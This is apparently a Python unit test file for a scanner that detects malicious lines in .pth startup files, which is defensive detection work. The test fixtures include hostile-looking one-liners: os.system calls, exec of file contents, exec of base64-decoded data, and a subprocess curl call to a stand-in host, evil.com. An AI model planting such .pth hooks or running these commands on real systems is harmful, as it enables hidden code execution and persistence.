import textwrap
import unittest
from pathlib import Path

from schedy_seraph.scanners.pth import PthScanner


def _scan(tmp: Path, content: str):
    f = tmp / "test.pth"
    f.write_text(textwrap.dedent(content))
    return list(PthScanner()._scan_file(f))


class TestPthScanner(unittest.TestCase):
    def setUp(self):
        import tempfile
        self._td = tempfile.TemporaryDirectory()
        self.tmp = Path(self._td.name)

    def tearDown(self):
        self._td.cleanup()

    def test_clean_path_entry(self):
        self.assertEqual(_scan(self.tmp, "/usr/lib/python3/dist-packages\n"), [])

    def test_comment_ignored(self):
        self.assertEqual(_scan(self.tmp, "# import os\n"), [])

    def test_blank_lines_ignored(self):
        self.assertEqual(_scan(self.tmp, "\n\n\n"), [])

    def test_import_detected(self):
        findings = _scan(self.tmp, "import os; os.system('id')\n")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].matched_pattern, "import ")

    def test_exec_detected(self):
        findings = _scan(self.tmp, "exec(open('/tmp/x').read())\n")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].matched_pattern, "exec(")

    def test_base64_detected(self):
        findings = _scan(self.tmp, "import base64; exec(base64.b64decode('cGF5bG9hZA=='))\n")
        self.assertEqual(len(findings), 1)

    def test_subprocess_detected(self):
        findings = _scan(self.tmp, "import subprocess; subprocess.run(['curl', 'http://evil.com'])\n")
        self.assertEqual(len(findings), 1)

    def test_one_finding_per_line(self):
        findings = _scan(self.tmp, "exec(subprocess.check_output(['id']))\n")
        self.assertEqual(len(findings), 1)

    def test_line_number_correct(self):
        findings = _scan(self.tmp, "/legit/path\nimport os\n")
        self.assertEqual(findings[0].line_number, 2)

    def test_severity_is_high(self):
        findings = _scan(self.tmp, "exec('payload')\n")
        self.assertEqual(findings[0].severity, "high")


if __name__ == "__main__":
    unittest.main()
